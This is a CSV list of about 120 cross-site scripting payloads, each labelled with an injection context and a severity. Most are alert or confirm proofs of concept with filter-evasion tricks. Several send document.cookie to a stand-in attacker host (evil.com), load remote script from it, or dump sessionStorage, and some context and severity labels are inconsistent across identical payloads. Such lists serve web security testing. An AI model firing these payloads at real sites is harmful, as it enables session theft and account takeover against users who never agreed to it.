payload,context,severity
"""><img src=x onerror=alert(document.cookie));>",tag_injection,high
\x3csvg onload=alert(1)\x3e,event_handler,medium
"location
=""javascript:alert(	1)""",dom_sink,low
javascript:confirm(1),js_uri,low
"<svg onload=""confirm(7)"">",tag_injection,medium
"<img/src
=x onerror
=alert(	1)//>",tag_injection,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"onload=""confirm(1)""",tag_injection,medium
onload='alert(1)',tag_injection,medium
' onerror=alert(1) x=',attribute_escape,high
<img/src/onerror=alert(1),tag_injection,medium
.alert(1);,tag_injection,medium
prompt(9),tag_injection,medium
"""><svg
 onload=alert()>",tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<svg/onload=alert(1)>,tag_injection,medium
alert(2),tag_injection,medium
<script>confirm(document.domain)</script>,script_injection,low
onerror=alert(0);>,tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
j\u0061v\u0061script:\u0061\u006cert(1),attribute_escape,medium
<script src=//evil.com/xss.js></script>,template_injection,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
onerror=alert(0);>,tag_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
<script src=//evil.com/xss.js></script>,script_injection,medium
<svg onload=alert()>,attribute_escape,medium
<ScRiPt sRc=//eViL.CoM/XsS.Js></sCrIpT>,script_injection,low
<%= confirm(1) %>,event_handler,low
' onmouseover=alert(1) ',attribute_escape,high
"<object data=""javascr/**/ipt:alert(1)"">",tag_injection,medium
""" onfocus=alert(1) autofocus=""",js_uri,medium
<%= alert(1) %>,attribute_escape,low
<svg////////onload=alert(1)>,tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,high
<img src/onerror=alert(1)>,tag_injection,medium
prompt(9),tag_injection,medium
<script>alert(1)</script>,script_injection,low
"""><svg onload=alert()>",tag_injection,medium
<svg onload=alert(1)>,tag_injection,medium
javascript:alert(document.domain),js_uri,medium
onload='alert(1)',tag_injection,medium
"data:text/html,<script>alert(1)</script>",attribute_escape,high
%3Cimg src=x onerror=alert(1)%3E,tag_injection,medium
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",attribute_escape,high
"location=""javaSCRIPT:alert(1)""",tag_injection,medium
‘; alert(1);,tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
<img src/onerror=prompt(8)>,tag_injection,medium
"<embed src=""javascript:confirm(1)"">",tag_injection,low
"<svG/x="">""/onfocus=confirm()//",attribute_escape,medium
<select ^__^>alert(String.fromCharCode(49))</script ^__^,tag_injection,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
confirm(1))</SCRIPT>,tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,script_injection,high
""" onload=alert(1) x=""",attribute_escape,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
"setTimeout(""alert(1)"",0)",dom_sink,low
-alert(1)-',tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
"<iframe src=""javascript:alert(1)"">",attribute_escape,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
location='javaScriPt:alert\x2845\x29',script_injection,high
<img src/onerror=prompt(8)>,tag_injection,medium
<audio src/onerror=alert(1)>,tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"document.body.innerHTML
=""<img src
=x onerror
=alert(	1)>""",dom_sink,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
<script src=//evil.com/xss.js></script>,script_injection,low
javascript:alert(1),attribute_escape,low
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
";alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
<svg><a onload=alert(1)></a>,tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
innerHTML=location.hash>#<script>self.alert(1)</script>,tag_injection,high
"<iframe src=""javascript:alert(1)"">",tag_injection,medium
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",attribute_escape,high
<iframe/onload=alert(0);>,attribute_escape,medium
"setTimeout(	""alert(	1)"",0)",dom_sink,high
"\"" onerror=alert(1)//",js_uri,high
"""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,low
%20javascript:alert(1),js_uri,medium
"\"" onerror=alert(1)//",attribute_escape,high
{{7*7}},script_injection,low
<%= aLeRt(1) %>,script_injection,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,low
<script>alert(document.domain)</script>,script_injection,medium
onerror='alert(1)',tag_injection,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"<iframe src=""javascript:alert(1)"">",event_handler,medium
;alert(1);,tag_injection,medium
<marquee onstart=al'+'ert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"javascript:void(document.location=""http://evil.com"")",template_injection,low
"<img src
=x onerror
=alert(	1)>",script_injection,high
' onerror=alert(1) x=',attribute_escape,low
<img/src=x onerror=\u0061\u006cert(1)//>,event_handler,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<svgonload=alert(1)>,tag_injection,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
javascript:alert(	document.domain),js_uri,low
' ><img src=x onerror=alert(1)>,tag_injection,high
' ><img src=x onload=alert(1)>,attribute_escape,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,tag_injection,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
